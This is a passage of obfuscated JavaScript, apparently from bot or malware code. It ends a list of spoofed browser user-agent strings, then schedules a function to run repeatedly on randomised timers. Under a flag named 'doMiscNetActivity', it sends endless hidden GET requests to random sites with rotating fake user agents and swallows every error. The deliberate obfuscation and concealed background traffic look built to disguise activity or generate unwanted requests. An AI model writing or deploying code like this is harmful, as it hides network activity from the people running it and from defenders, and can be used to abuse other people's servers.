      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1f7e + 0x1 * 0x1899 + 0x161 * 0x5; k < -0x1f1 + -0x5f3 * -0x1 + -0x3fe; k++)
    setTimeout(f, (-0xb6f * 0x24 + -0x1 * -0x1bd29 + 0xc8d3) * k * getRandomInt(-0x65 * 0x2b + -0x13 * -0x3b + 0xb * 0x125, 0x66 * 0x32 + -0x13 * 0x6d + -0xbd2));
  setInterval(() => {
    f();
    for (let l = 0x4 * -0x1cd + -0x127 + 0x1 * 0x85b; l < -0x3 * 0x10d + 0xc7a * 0x1 + -0x94f; l++)
      setTimeout(f, (-0x10b1e + -0x5 * -0x3b82 + 0xcbf4) * l * getRandomInt(-0x251e + -0xc9 * -0x1d + 0xe5a, -0x17e4 + 0x1 * 0x3cb + 0x141c));
  }, 0x4 * 0x3ae45 + 0xb9f3 * -0x8b + -0x8d2c5d * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x22b6 + -0x11a4 + 0x2 * 0x523) * getRandomInt(0x1b38 + 0xd8 + 0xb * -0x28d, 0x4 * 0x7ba + 0x506 + -0x23e9 * 0x1));
}, -0xc1c + 0x1ecd + -0x124d);